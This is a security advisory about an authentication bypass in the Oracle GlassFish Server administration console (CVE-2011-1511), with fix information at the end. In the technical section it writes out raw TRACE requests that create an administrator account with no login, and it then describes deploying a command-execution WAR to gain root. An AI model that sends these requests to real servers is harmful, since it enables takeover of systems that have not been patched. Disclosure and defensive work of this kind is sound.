Description
===========
Core security released a bug in Oracle GlassFish Server Administration Console on 5th May 2011 which can be found here:
http://www.securityfocus.com/archive/1/517965/30/0/threaded 
and here
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-1511 

The rating of this issue is classified as medium due to it only returning sensitive information. A full fix has been released by Oracle.

NGS found that it is possible to use this issue to create a GlassFish administrator account as an unauthenticated user.

=================
Technical Details
=================
There is a known authentication bypass in Glassfish, by using a TRACE method rather than a GET method it is possible to access data meant only for Glassfish administrators.
The following requests were used to create a new Glassfish administrator:

TRACE /common/security/realms/manageUserNew.jsf?name=admin-realm&configName=server-config&bare=true HTTP/1.1
Host: 10.65.78.211:4848
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101Firefox/6.0

Accept-Language: en-gb,en;q=0.5

Cookie: JSESSIONID=ada23501f36f1ec9148589e9a574

This then gave access to the create user page, however it is important that when the submit button is pressed the resultant POST request be converted to a TRACE request.

TRACE /common/security/realms/manageUserNew.jsf?propertyForm%3ApropertySheet%3ApropertSectionTextField%3AuserIdProp%3AUserId=NGSSecure&propertyForm%3ApropertySheet%3ApropertSectionTextField%3AnewPasswordProp%3ANewPassword=Password!!&propertyForm%3ApropertySheet%3ApropertSectionTextField%3AconfirmPasswordProp%3AConfirmPassword=Password!!&propertyForm%3AhelpKey=ref-filerealmusernew.html&propertyForm_hidden=propertyForm_hidden&javax.faces.ViewState=-2309913764624097582%3A-

This created a user called NGSSecure with a password of Password!!

NGS then logged on to the Glassfish administration console using this newly created user. Once logged on as this user it was possible to upload and deploy a website, NGS deployed cmd.war which allowed the user to run commands under the context of the GlassFish server which is root by default.

===============
Fix Information
===============
This issue has been fixed in GlassFish 3.1, a workaround also exists which is to disable the TRACE method on the administrator consoles web port
